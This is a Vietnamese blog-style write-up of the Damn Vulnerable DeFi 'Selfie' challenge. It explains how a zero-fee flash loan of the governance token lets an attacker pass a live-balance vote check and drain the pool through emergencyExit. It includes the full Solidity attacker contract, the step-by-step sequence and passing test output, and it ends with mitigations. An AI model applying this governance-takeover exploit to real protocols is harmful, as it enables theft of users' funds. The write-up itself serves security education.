---
title: "[DVD-08] Selfie: flash loan để mua phiếu bầu, chiếm governance rút sạch pool"
description: "Mục tiêu là rút 1,5 triệu DVV khỏi SelfiePool thông qua emergencyExit — hàm chỉ governance mới gọi được. Lỗ hổng nằm ở chỗ SimpleGovernance kiểm tra quyền đề xuất bằng số phiếu tức thời (getVotes), nên attacker chỉ cần flash loan token của chính pool, tự delegate rồi queueAction."
pubDate: 2026-08-24
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "governance", "flash-loan"]
draft: true
challenge: "damn-vulnerable-defi"
difficulty: "medium"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Selfie kết hợp hai mảnh ghép kinh điển: một governance contract kiểm tra quyền bỏ phiếu bằng **số dư tức thời** và một pool cho vay flash loan **chính token làm phiếu** với phí bằng 0. Attacker vay 1,5 triệu token (75% tổng cung) từ pool, tự delegate để có quyền biểu quyết, đề xuất action `emergencyExit` đổ toàn bộ pool về ví của mình, trả nợ flash loan, chờ 2 ngày time-lock rồi execute. Pool rỗng, recovery nhận đủ 1,5 triệu token.

## Bối cảnh & Mục tiêu

Ba contract tham gia:

- **DamnValuableVotes** (`src/DamnValuableVotes.sol`) — ERC20 kết hợp `ERC20Votes`: số phiếu của một địa chỉ chỉ được tính sau khi chủ sở hữu gọi `delegate()` (checkpoint theo lịch sử chuyển token).
- **SimpleGovernance** (`src/selfie/SimpleGovernance.sol`) — ai có số phiếu > nửa tổng cung thì được `queueAction()`; action phải chờ `ACTION_DELAY_IN_SECONDS = 2 days` rồi mới `executeAction()` được.
- **SelfiePool** (`src/selfie/SelfiePool.sol`) — pool nắm token, cho flash loan chuẩn ERC-3156 **không tính phí** (`flashFee` trả về 0, dòng 43–48), và có hàm `emergencyExit()` chuyển toàn bộ số dư đi — nhưng chỉ `onlyGovernance` (dòng 24–29, 71–76).

Trạng thái ban đầu (`test/selfie/Selfie.t.sol`): tổng cung 2.000.000 DVV, pool nắm 1.500.000, player không có token nào. Điều kiện thắng (`_isSolved()`, dòng 112–116): pool hết token, recovery có đúng 1.500.000 DVV.

## Phân tích lỗ hổng

Hàm quyết định ai được đề xuất nằm tại `src/selfie/SimpleGovernance.sol:100-104`:

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

`getVotes(who)` trả về số phiếu **tại thời điểm gọi**, không phải tại một thời điểm chụp (snapshot) nào đó trong quá khứ. Ngưỡng là nửa tổng cung = 1.000.000 phiếu. Ai kiểm soát được 1.500.000 token — dù chỉ trong một giao dịch — đều vượt ngưỡng.

Mấu chốt thứ hai nằm ở chính pool (`src/selfie/SelfiePool.sol:50-69`):

```solidity
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
    external
    nonReentrant
    returns (bool)
{
    if (_token != address(token)) revert UnsupportedCurrency();

    token.transfer(address(_receiver), _amount);
    if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }
    if (!token.transferFrom(address(_receiver), address(this), _amount)) {
        revert RepayFailed();
    }
    return true;
}
```

Pool cho vay chính governance token, không phí, và không hạn chế ai được vay. Điều này vô tình biến pool thành "máy in phiếu bầu": bất kỳ ai cũng có thể mượn 1,5 triệu phiếu, đề xuất action có hại cho chính pool, trả nợ, rồi để action trôi qua time-lock 2 ngày trước khi kích nổ.

Lưu ý kỹ thuật với ERC20Votes: chuyển token vào tay attacker chưa đủ — phải gọi `delegate(address(this))` trong callback để checkpoint đánh dấu số phiếu. Nếu quên bước này, `getVotes` vẫn bằng 0 dù balance rất lớn.

## Khai thác

Contract `SelfieAttacker` (test/selfie/Selfie.t.sol:11-46) triển khai `IERC3156FlashBorrower`:

```solidity
function attack(uint256 amount) external {
    pool.flashLoan(this, address(token), amount, "");
}

function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
    external
    returns (bytes32)
{
    token.delegate(address(this)); // tự delegate để có phiếu NGAY trong callback
    actionId = governance.queueAction(address(pool), 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery)));
    token.approve(address(pool), amount); // chuẩn bị trả nợ
    return CALLBACK_SUCCESS;
}

function execute() external {
    governance.executeAction(actionId);
}
```

Diễn tiến trong `test_selfie()`:

1. Flash loan 1.500.000 DVV từ pool.
2. Trong `onFlashLoan`: `delegate(address(this))` → `getVotes(attacker) = 1.500.000 > 1.000.000` → `queueAction(pool, 0, emergencyExit(recovery))` thành công, nhận `actionId`.
3. Approve và trả đủ nợ flash loan — pool không mất gì ở bước này.
4. `vm.warp(block.timestamp + 2 days)` — vượt qua `ACTION_DELAY_IN_SECONDS`.
5. `execute()` → governance gọi `pool.emergencyExit(recovery)` → toàn bộ 1,5 triệu DVV chuyển sang recovery.

Không cần sở hữu một token nào ngay từ đầu: vốn cho cuộc tấn công chính là tài sản của pool.

## Kết quả

Chạy `forge test --match-path test/selfie/Selfie.t.sol`:

```
Ran 2 tests for test/selfie/Selfie.t.sol:SelfieChallenge
[PASS] test_assertInitialState() (gas: 23788)
[PASS] test_selfie() (gas: 730063)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Bỏ phiếu phải dựa trên snapshot lịch sử, không phải balance tức thời.** Lưu khối (hoặc timestamp) chụp trạng thái phiếu tại thời điểm bắt đầu bỏ phiếu, và yêu cầu người bỏ phiếu đã nắm giữ/và delegate token từ trước đó một khoảng thời gian tối thiểu — khi đó flash loan không thể tạo phiếu.
- **Không cho vay chính governance token qua flash loan.** Một pool flash loan nên tách biệt tài sản dùng để vay và tài sản dùng để bỏ phiếu, hoặc phải có cơ chế chống "vote-borrowing" như trên.
- **Time-lock không phải lá chắn:** action độc hại vẫn được thực thi sau 2 ngày — time-lock chỉ cho người dùng thời gian rút lui, không ngăn thiệt hại nếu không có cơ chế hủy action (cancellation) và theo dõi rủi ro. Vụ tấn công Beanstalk (2022) là minh chứng thực tế cho cùng một lớp lỗ hổng flash loan + governance.

## Tham khảo

- Challenge: [Selfie — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/challenges/selfie)
- Source: `src/selfie/SimpleGovernance.sol`, `src/selfie/SelfiePool.sol`, `test/selfie/Selfie.t.sol`
